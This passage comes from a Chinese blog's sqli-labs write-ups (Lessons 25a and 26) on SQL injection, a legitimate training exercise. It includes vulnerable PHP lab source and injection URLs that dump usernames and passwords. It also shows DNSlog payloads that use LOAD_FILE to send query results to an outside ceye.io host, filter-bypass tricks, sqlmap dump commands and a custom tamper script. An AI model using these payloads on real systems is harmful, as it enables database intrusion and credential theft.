$row['username'];</span></span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">'YOU ARE IN ........'</span>;\t  \t</span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">\t  \t<span class=\"comment\">//echo 'Your Password:' .$row['password'];</span></span></span><br><span class=\"line\"><span class=\"php\">\t  \t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/font&gt;\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">  \t&#125;</span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"keyword\">else</span> </span></span><br><span class=\"line\"><span class=\"php\">\t&#123;</span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">'&lt;font size=\"5\" color=\"#FFFF00\"&gt;'</span>;</span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">'You are in...........'</span>;</span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"comment\">//print_r(mysql_error());</span></span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"comment\">//echo \"You have an error in your SQL syntax\";</span></span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;&lt;/font&gt;\"</span>;\t</span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">'&lt;font color= \"#0000ff\" font size= 3&gt;'</span>;\t</span></span><br><span class=\"line\"><span class=\"php\">\t</span></span><br><span class=\"line\"><span class=\"php\">\t&#125;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"keyword\">else</span> </span></span><br><span class=\"line\"><span class=\"php\">&#123; </span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"Please input the ID as parameter with numeric value\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">blacklist</span><span class=\"params\">($id)</span></span></span></span><br><span class=\"line\"><span class=\"php\">&#123;</span></span><br><span class=\"line\"><span class=\"php\">\t$id= preg_replace(<span class=\"string\">'/or/i'</span>,<span class=\"string\">\"\"</span>, $id);\t\t\t<span class=\"comment\">//strip out OR (non case sensitive)</span></span></span><br><span class=\"line\"><span class=\"php\">\t$id= preg_replace(<span class=\"string\">'/AND/i'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//Strip out AND (non case sensitive)</span></span></span><br><span class=\"line\"><span class=\"php\">\t</span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"keyword\">return</span> $id;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"meta\">?&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p>现在正确只显示<code>YOU ARE IN ........</code>,错误显示<code>You are in...........</code></p>\n<h2 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h2><p>这里可以写通过根据错误的回显不同编写脚本来提高忙注的效率。</p>\n<h2 id=\"DNSlog\"><a href=\"#DNSlog\" class=\"headerlink\" title=\"DNSlog\"></a>DNSlog</h2><p>上面这样的布尔型盲注即使使用二分法也需要一些的时间,编写脚本又觉得费力,怎么办,试试DNSlog。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">LOAD_FILE</span>(<span class=\"keyword\">CONCAT</span>(<span class=\"string\">'\\\\\\\\'</span>,(<span class=\"keyword\">SELECT</span> <span class=\"keyword\">password</span> <span class=\"keyword\">FROM</span> mysql.user <span class=\"keyword\">WHERE</span> <span class=\"keyword\">user</span>=<span class=\"string\">'root'</span> <span class=\"keyword\">LIMIT</span> <span class=\"number\">1</span>),<span class=\"string\">'.mysql.ip.port.b182oj.ceye.io\\\\abc'</span>))</span><br></pre></td></tr></table></figure>\n\n<p>上面这个是一个mysql数据库的DNSlog注入的payload。访问的是mysql.ip.port.b182oj.ceye.io下的abc资源,资源名可以任意填，目的只是让目标在该DNS解析上留下记录。</p>\n<p>需要了解的是能通过load_file函数发送DNS请求。通过该函数发送数据给某个url,会在DNS服务器上留下DNS解析的记录,通过查询这个记录就能够获得想要的信息。具体操作一遍就没那么复杂了。</p>\n<p>现在<a href=\"http://ceye.io\" target=\"_blank\" rel=\"noopener\">http://ceye.io</a> 注册一个账号。获得自己的二级域名,类似于abcdef.ceye.io之类的。</p>\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.133/sql/Less-25a/?id=1 union select 1,2,3%23</code></p>\n<p>已经测试出了字段数,在对应位置填写payload。</p>\n<p>如果不成功,确认Mysql配置文件<code>my.ini</code>下存在<code>secure-file-priv</code>,并且没被注释</p>\n<h3 id=\"获取当前数据库\"><a href=\"#获取当前数据库\" class=\"headerlink\" title=\"获取当前数据库\"></a>获取当前数据库</h3><p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select database()),&#39;.你的域名.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/005.png\" alt=\"005\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p>load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析</p>\n<p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select table_name from infoorrmation_schema.tables where table_schema=&#39;security&#39; limit 3,1),&#39;.你的域名.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/006.png\" alt=\"006\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select column_name from infoorrmation_schema.columns where table_name=&#39;users&#39; limit 2,1),&#39;.你的域名.ceye.io\\\\abc&#39;))),3%23</code></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><img src=\"/img/sql/Lesson-25a/007.png\" alt=\"007\"></p>\n<p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select concat(username,&#39;_&#39;,passwoorrd) from users limit 1,1),&#39;.你的域名.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/008.png\" alt=\"008\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>还是使用上一课写的绕过or和and的脚本。</p>\n<figure class=\"highlight haml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-<span class=\"ruby\">-dbsm <span class=\"symbol\">msql:</span>指定后端数据库为mysql</span></span><br><span class=\"line\"><span class=\"ruby\">--technique <span class=\"symbol\">T:</span>指定注入方式为时间注入</span></span><br><span class=\"line\"><span class=\"ruby\">--threads <span class=\"number\">10</span><span class=\"symbol\">:</span>指定并发线程数为<span class=\"number\">10</span></span></span><br><span class=\"line\"><span class=\"ruby\">--tamper andor.<span class=\"symbol\">py:</span>payload中的<span class=\"keyword\">and</span>用anandd <span class=\"keyword\">or</span>用oorr替代</span></span><br></pre></td></tr></table></figure>\n\n<p><code>python sqlmap.py -u &quot;http://10.60.250.250/sql/Less-25a/?id=1&quot; --dbms mysql --technique T --threads 10 --tamper &quot;andor.py&quot;</code></p>\n<p><img src=\"/img/sql/Lesson-25a/009.png\" alt=\"009\"></p>\n<p><code>python sqlmap.py -u &quot;http://10.60.250.250/sql/Less-25a/?id=1&quot; --dbms mysql --technique T --threads 10 --tamper &quot;andor.py&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-25a/010.png\" alt=\"010\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-25a-GET基于盲注整型单引号-你的OR及AND归我所有\"><a href=\"#sqli-labs-lession-25a-GET基于盲注整型单引号-你的OR及AND归我所有\" class=\"headerlink\" title=\"sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有\"></a>sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-25a/001.png\" alt=\"001\"></p>\n<h2 id=\"手注-BUG\"><a href=\"#手注-BUG\" class=\"headerlink\" title=\"手注(BUG?)\"></a>手注(BUG?)</h2><p>这里和Lesson-25的过滤没有区别,只不过没法利用报错注入了。试一试能不能直接返回数据。</p>\n<p><code>http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,database(),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/002.png\" alt=\"002\"></p>\n<p><code>http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/003.png\" alt=\"003\"></p>\n<p>中间一样的,直接获取字段值吧。</p>\n<p><code>http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,(select group_concat(username,&#39;:&#39;,passwoorrd) from users),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/004.png\" alt=\"004\"></p>\n<p>恩…题目不是盲注吗,是不是我把源码动过了,修改源码中的php源码并保存。</p>\n<p>修改地方：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">error_reporting(<span class=\"number\">0</span>);</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">//including the Mysql connect parameters.</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"keyword\">include</span>(<span class=\"string\">\"../sql-connections/sql-connect.php\"</span>);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// take the variables</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'id'</span>]))</span></span><br><span class=\"line\"><span class=\"php\">&#123;</span></span><br><span class=\"line\"><span class=\"php\">$id=$_GET[<span class=\"string\">'id'</span>];</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">//logging the connection parameters to a file for analysis.</span></span></span><br><span class=\"line\"><span class=\"php\">$fp=fopen(<span class=\"string\">'result.txt'</span>,<span class=\"string\">'a'</span>);</span></span><br><span class=\"line\"><span class=\"php\">fwrite($fp,<span class=\"string\">'ID:'</span>.$id.<span class=\"string\">\"\\n\"</span>);</span></span><br><span class=\"line\"><span class=\"php\">fclose($fp);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"comment\">//fiddling with comments</span></span></span><br><span class=\"line\"><span class=\"php\">\t$id= blacklist($id);</span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"comment\">//echo \"&lt;br&gt;\";</span></span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"comment\">//echo $id;</span></span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"comment\">//echo \"&lt;br&gt;\";</span></span></span><br><span class=\"line\"><span class=\"php\">\t$hint=$id;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// connectivity </span></span></span><br><span class=\"line\"><span class=\"php\">$sql=<span class=\"string\">\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">$result=mysql_query($sql);</span></span><br><span class=\"line\"><span class=\"php\">$row = mysql_fetch_array($result);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"keyword\">if</span>($row)</span></span><br><span class=\"line\"><span class=\"php\">\t&#123;</span></span><br><span class=\"line\"><span class=\"php\">  \t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;font size='5' color= '#99FF00'&gt;\"</span>;\t</span></span><br><span class=\"line\"><span class=\"php\">\t  \t<span class=\"comment\">//echo 'Your Login name:'. $row['username'];</span></span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">'YOU ARE IN ........'</span>;\t  \t</span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">\t  \t<span class=\"comment\">//echo 'Your Password:' .$row['password'];</span></span></span><br><span class=\"line\"><span class=\"php\">\t  \t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/font&gt;\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">  \t&#125;</span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"keyword\">else</span> </span></span><br><span class=\"line\"><span class=\"php\">\t&#123;</span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">'&lt;font size=\"5\" color=\"#FFFF00\"&gt;'</span>;</span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">'You are in...........'</span>;</span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"comment\">//print_r(mysql_error());</span></span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"comment\">//echo \"You have an error in your SQL syntax\";</span></span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;&lt;/font&gt;\"</span>;\t</span></span><br><span class=\"line\"><span class=\"php\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">'&lt;font color= \"#0000ff\" font size= 3&gt;'</span>;\t</span></span><br><span class=\"line\"><span class=\"php\">\t</span></span><br><span class=\"line\"><span class=\"php\">\t&#125;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"keyword\">else</span> </span></span><br><span class=\"line\"><span class=\"php\">&#123; </span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"Please input the ID as parameter with numeric value\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">blacklist</span><span class=\"params\">($id)</span></span></span></span><br><span class=\"line\"><span class=\"php\">&#123;</span></span><br><span class=\"line\"><span class=\"php\">\t$id= preg_replace(<span class=\"string\">'/or/i'</span>,<span class=\"string\">\"\"</span>, $id);\t\t\t<span class=\"comment\">//strip out OR (non case sensitive)</span></span></span><br><span class=\"line\"><span class=\"php\">\t$id= preg_replace(<span class=\"string\">'/AND/i'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//Strip out AND (non case sensitive)</span></span></span><br><span class=\"line\"><span class=\"php\">\t</span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"keyword\">return</span> $id;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"meta\">?&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p>现在正确只显示<code>YOU ARE IN ........</code>,错误显示<code>You are in...........</code></p>\n<h2 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h2><p>这里可以写通过根据错误的回显不同编写脚本来提高忙注的效率。</p>\n<h2 id=\"DNSlog\"><a href=\"#DNSlog\" class=\"headerlink\" title=\"DNSlog\"></a>DNSlog</h2><p>上面这样的布尔型盲注即使使用二分法也需要一些的时间,编写脚本又觉得费力,怎么办,试试DNSlog。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">LOAD_FILE</span>(<span class=\"keyword\">CONCAT</span>(<span class=\"string\">'\\\\\\\\'</span>,(<span class=\"keyword\">SELECT</span> <span class=\"keyword\">password</span> <span class=\"keyword\">FROM</span> mysql.user <span class=\"keyword\">WHERE</span> <span class=\"keyword\">user</span>=<span class=\"string\">'root'</span> <span class=\"keyword\">LIMIT</span> <span class=\"number\">1</span>),<span class=\"string\">'.mysql.ip.port.b182oj.ceye.io\\\\abc'</span>))</span><br></pre></td></tr></table></figure>\n\n<p>上面这个是一个mysql数据库的DNSlog注入的payload。访问的是mysql.ip.port.b182oj.ceye.io下的abc资源,资源名可以任意填，目的只是让目标在该DNS解析上留下记录。</p>\n<p>需要了解的是能通过load_file函数发送DNS请求。通过该函数发送数据给某个url,会在DNS服务器上留下DNS解析的记录,通过查询这个记录就能够获得想要的信息。具体操作一遍就没那么复杂了。</p>\n<p>现在<a href=\"http://ceye.io\" target=\"_blank\" rel=\"noopener\">http://ceye.io</a> 注册一个账号。获得自己的二级域名,类似于abcdef.ceye.io之类的。</p>\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.133/sql/Less-25a/?id=1 union select 1,2,3%23</code></p>\n<p>已经测试出了字段数,在对应位置填写payload。</p>\n<p>如果不成功,确认Mysql配置文件<code>my.ini</code>下存在<code>secure-file-priv</code>,并且没被注释</p>\n<h3 id=\"获取当前数据库\"><a href=\"#获取当前数据库\" class=\"headerlink\" title=\"获取当前数据库\"></a>获取当前数据库</h3><p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select database()),&#39;.你的域名.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/005.png\" alt=\"005\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p>load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析</p>\n<p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select table_name from infoorrmation_schema.tables where table_schema=&#39;security&#39; limit 3,1),&#39;.你的域名.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/006.png\" alt=\"006\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select column_name from infoorrmation_schema.columns where table_name=&#39;users&#39; limit 2,1),&#39;.你的域名.ceye.io\\\\abc&#39;))),3%23</code></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><img src=\"/img/sql/Lesson-25a/007.png\" alt=\"007\"></p>\n<p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select concat(username,&#39;_&#39;,passwoorrd) from users limit 1,1),&#39;.你的域名.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/008.png\" alt=\"008\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>还是使用上一课写的绕过or和and的脚本。</p>\n<figure class=\"highlight haml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-<span class=\"ruby\">-dbsm <span class=\"symbol\">msql:</span>指定后端数据库为mysql</span></span><br><span class=\"line\"><span class=\"ruby\">--technique <span class=\"symbol\">T:</span>指定注入方式为时间注入</span></span><br><span class=\"line\"><span class=\"ruby\">--threads <span class=\"number\">10</span><span class=\"symbol\">:</span>指定并发线程数为<span class=\"number\">10</span></span></span><br><span class=\"line\"><span class=\"ruby\">--tamper andor.<span class=\"symbol\">py:</span>payload中的<span class=\"keyword\">and</span>用anandd <span class=\"keyword\">or</span>用oorr替代</span></span><br></pre></td></tr></table></figure>\n\n<p><code>python sqlmap.py -u &quot;http://10.60.250.250/sql/Less-25a/?id=1&quot; --dbms mysql --technique T --threads 10 --tamper &quot;andor.py&quot;</code></p>\n<p><img src=\"/img/sql/Lesson-25a/009.png\" alt=\"009\"></p>\n<p><code>python sqlmap.py -u &quot;http://10.60.250.250/sql/Less-25a/?id=1&quot; --dbms mysql --technique T --threads 10 --tamper &quot;andor.py&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-25a/010.png\" alt=\"010\"></p>\n"},{"title":"sqli-labs lession 26 GET基于错误-你的空格和注释归我所有","date":"2018-10-05T08:24:20.000Z","_content":"\n# sqli-labs lession 26 GET基于错误-你的空格和注释归我所有\n\n---\n\n\n\n## 登录界面\n\n![001](/img/sql/Lesson-26/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-26/002.png)\n\n```\nfunction blacklist($id)\n{\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n\t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n\t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #\n\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t\t//Strip out slashes\n\treturn $id;\n}\n```\n\n过滤了 or and / * -- # 空格 \\\n\nor and还可以用上一课的方法\n\n### 绕过空格\n\n1. /**/ \n\n被本课的/*过滤\n\n2. `/**_**/`\n\n被本课的/*过滤\n\n3. #加一个换行符`%23%0A`和`-- `加一个换行符`--%0A`\n\n分别被本课的#过滤和--过滤\n\n4. 空白符替换\n\n这里要注意下,我用的Phpstudy搭建的环境,有的成功绕过,有的不行。\n\n%09 TAB键（水平） \n\n%0A 新建一行\n\n%0C 新的一页\n\n%0D return功能\n\n%0B TAB键（垂直） （php-5.2.17,5.3.29成功）\n\n%A0 空格 （php-5.2.17成功）\n\n5. 用()绕过,意思就是不使用任何空格\n\n括号可以用来包围子查询，任何计算结果的语句都可以使用`()`包围\n\n## 手注\n\n知道上述信息就可做了。如果要使用`%0B`做的话切换版本为php-5.2.17或5.3.29。用()绕过做这几个都行。\n\n我下面用phpStudy切换版本为php-5.4.45做。\n\n### 获取数据库名\n\n`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,database(),0x7e))%7c%7c'1`\n\n![003](/img/sql/Lesson-26/003.png)\n\n### 获取表名\n\n`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security')),0x7e))%7c%7c'1`\n\n![004](/img/sql/Lesson-26/004.png)\n\n### 获取列名\n\n`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='users')),0x7e))%7c%7c'1`\n\n![005](/img/sql/Lesson-26/005.png)\n\n### 获取字段值\n\n原谅我数据库学的不好,暂时只想到了按id找。\n\n`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,(select(concat(username,'~',passwoorrd))from(security.users)where(id=1)),0x7e))%7c%7c'1`\n\n![006](/img/sql/Lesson-26/006.png)\n\n## SQLMAP\n\nsqlmap跑的话要切换php-5.2.17的版本\n\n### 修改脚本\n\nspace2plus.py：空格替换为加号\n\n在sqlmap的tamper目录下新建space0A.py文件,把space2plus.py脚本中内容复制过来,+改成`%A0`。\n\n```\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with plus ('%A0')\n\n    Notes:\n        * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards\n        * This tamper script works against all databases\n\n    >>> tamper('SELECT id FROM users')\n    'SELECT%A0id%A0FROM%A0users'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += \"%A0\"\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += \"%A0\"\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n```\n\n### 运行\n\n结合上次双写绕过and和or的andor.py脚本跑一下。\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-26/?id=1\" --threads 10 --technique E --dbms mysql --tamper \"space0A.py,andor.py\" --fresh-queries --flush-session`\n\n```\n--dbsm msql:指定后端数据库为mysql\n--technique E:指定注入方式为报错注入\n--threads 10:指定并发线程数为10\n--tamper space0A.py,andor.py\n\tandor.py:payload中的and用anandd or用oorr替代\n\tspace0A.py:空格用%A0替代\n--fresh-queries:发起新请求 \n--flush-session：刷新session\n```\n\n![007](/img/sql/Lesson-26/007.png)\n\n![008](/img/sql/Lesson-26/008.png)\n\n`python sqlmap.py -u \"http://192.168.75.133/sql/Less-26/?id=1\" --threads 10 --technique E --dbms mysql --tamper \"andor.py,space0A.py\" -D security --tables  --fresh-queries --flush-session`\n\n![008_1](/img/sql/Lesson-26/008_1.png)\n\n![008_2](/img/sql/Lesson-26/008_2.png)\n\n跑字段的时候出现了问题,拿不到数据。原来SQLMAP的payload中使用了`count(*)`包括了`*`，但是`*`被过滤了。自然得不出结果。\n\n![008_3](/img/sql/Lesson-26/008_3.png)\n\n\n\n通过查询资料可以发现`count(*)`和`count(常量)`是等价的,添加一个把`count(*)`替换成`count(1)`的脚本,命名为`count.py`\n\n```\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom 